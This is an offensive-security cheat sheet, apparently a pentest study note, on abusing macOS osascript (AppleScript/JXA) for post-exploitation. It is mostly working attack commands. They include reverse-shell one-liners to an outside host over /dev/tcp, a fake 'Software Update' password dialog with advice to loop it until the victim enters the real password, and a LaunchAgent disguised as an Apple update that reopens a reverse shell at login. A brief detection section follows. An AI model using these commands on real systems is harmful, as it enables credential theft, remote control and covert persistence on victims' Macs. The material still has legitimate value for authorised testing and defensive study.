# osascript (AppleScript / JXA)

**Tags:** `#osascript` `#applescript` `#jxa` `#macos` `#scripting` `#lolbin` `#phishing` `#persistence` `#postexploitation`

`osascript` is macOS's built-in runner for **AppleScript** and **JavaScript for Automation
(JXA)** — the scripting bridge to the OS and to other apps. It's the macOS post-exploitation
workhorse: shell execution, **credential-prompt phishing**, persistence, and app automation,
all from a **signed Apple binary** (a LOLBin that frequently sails past application
allowlisting). JXA's Objective-C bridge is the basis of most macOS C2 payloads
(Mythic/Apfell-lineage). MITRE **T1059.002** (AppleScript), **T1056.002** (GUI cred prompt).

**Docs:** `man osascript` · Apple AppleScript/JXA release notes
**Install:** built into every macOS (`/usr/bin/osascript`).

---

## Running Scripts

```bash
osascript -e 'display notification "hi"'          # inline AppleScript
osascript script.scpt                             # compiled, or a .applescript
osascript -l JavaScript -e 'ObjC.import("Foundation")'   # JXA (JavaScript for Automation)
osascript -l JavaScript payload.js
echo '<applescript>' | osascript -                # from stdin
```

---

## Shell Execution / Reverse Shell

AppleScript's `do shell script` runs a command (via `/bin/sh`, so force bash for `/dev/tcp`):

```bash
osascript -e 'do shell script "id"'
osascript -e 'do shell script "bash -c \"bash -i >& /dev/tcp/10.10.14.5/9001 0>&1\""'

# Run the shell command as root if you can prompt (or already hold) admin:
osascript -e 'do shell script "id" with administrator privileges'
#   ^ pops the native macOS auth dialog — also a phishing vector (below)
```

## Credential-Prompt Phishing (T1056.002)

The signature macOS trick — a native, trusted-looking password dialog that returns whatever
the user types:

```bash
osascript -e 'set p to text returned of (display dialog "Software Update needs your password to continue." default answer "" with hidden answer with icon caution buttons {"OK"} default button 1)'
# → the typed password is captured in $p / stdout. Loop it until it matches to force a real entry.
```

`with administrator privileges` on a `do shell script` shows the real authorization prompt;
either path harvests the user's password without touching `/etc/`.

---

## Persistence (LaunchAgent)

```bash
# Drop a per-user LaunchAgent that re-runs your payload at login
cat > ~/Library/LaunchAgents/com.apple.softwareupdate.plist <<'EOF'
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
  <key>Label</key><string>com.apple.softwareupdate</string>
  <key>ProgramArguments</key><array><string>/usr/bin/osascript</string><string>-e</string>
    <string>do shell script "bash -c 'bash -i >& /dev/tcp/10.10.14.5/9001 0>&1'"</string></array>
  <key>RunAtLoad</key><true/></dict></plist>
EOF
launchctl load ~/Library/LaunchAgents/com.apple.softwareupdate.plist
```

AppleScript/JXA can also add a **Login Item** (`System Events → make login item`).

---

## JXA — the ObjC Bridge (capable payloads)

JXA reaches the full Objective-C runtime, so it can do far more than `do shell script`
(spawn `NSTask`, call private frameworks, in-memory tradecraft):

```bash
osascript -l JavaScript -e 'ObjC.import("Foundation"); var t=$.NSTask.alloc.init; t.launchPath="/bin/sh"; t.arguments=["-c","id"]; t.launch;'
```

This is the foundation of macOS C2 agents; full offensive JXA belongs with payload frameworks
(defer the heavy stager content to [[Techniques/AV & EDR Evasion|AV & EDR Evasion]] under a clean model).

---

## Detection Footprint (TCC)

- Automating **other apps** (Mail, Finder, System Events, Terminal) fires **TCC** Apple-Events
  consent prompts and is logged — noisy, and a user "Don't Allow" kills it.
- `osascript` execution and `LaunchAgent` writes are logged by EDR/Unified Logging.
- Being Apple-signed helps against allowlisting but not behavioral detection.

---

## Quick Reference

| Goal | Command |
|---|---|
| Run inline AppleScript | `osascript -e '<script>'` |
| Run JXA | `osascript -l JavaScript payload.js` |
| Shell exec | `osascript -e 'do shell script "id"'` |
| Reverse shell | `osascript -e 'do shell script "bash -c \"bash -i >& /dev/tcp/IP/9001 0>&1\""'` |
| Phish the password | `osascript -e '… display dialog … with hidden answer …'` |
| Root prompt | `do shell script "…" with administrator privileges` |
| Persistence | LaunchAgent plist calling `osascript` + `launchctl load` |

---

> [!note] **See also** — the shell `do shell script` invokes: [[Tools/Command Shell/Bash|Bash]] / [[Tools/Command Shell/zsh|zsh]]; run it in [[Tools/Command Shell/iTerm2|iTerm2]]; other scripting languages [[Tools/Scripting/Python|Python]] / [[Tools/Scripting/JavaScript|JavaScript]]; reverse-shell catalogue [[Class notes/HTB Academy/CPTS v2 (claude)/Shells & Payloads|Shells & Payloads]]; heavy stager/evasion content [[Techniques/AV & EDR Evasion|AV & EDR Evasion]].

---

*Created: 2026-09-28*
*Updated: 2026-09-28*
*Model: claude-opus-4-8*
